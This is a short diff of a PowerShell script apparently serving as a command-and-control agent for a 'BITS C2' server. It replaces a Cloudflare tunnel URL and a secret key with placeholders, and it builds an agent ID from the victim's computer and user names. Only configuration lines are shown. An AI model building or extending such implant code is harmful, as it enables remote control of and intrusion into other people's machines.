@@ -3,12 +3,12 @@
 # Connects to main.py BITS C2 integration on port 8000
 
 # ========== CONFIGURE THIS ==========
-$C2_URL = "https://mandatory-zip-installing-illinois.trycloudflare.com"
+$C2_URL = "https://CHANGE-MECHANGE-ME.trycloudflare.com"
 # ====================================
 
 $ServerUrl = "$C2_URL/bits"
 $AgentId = $env:COMPUTERNAME + "_" + $env:USERNAME
-$SecretKey = "964fb7928cd27b5faf3b8971e5befcf6"
+$SecretKey = "00000000000000000000000000000000"
 
 # SSL/TLS setup - PS5/PS7 compatible
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
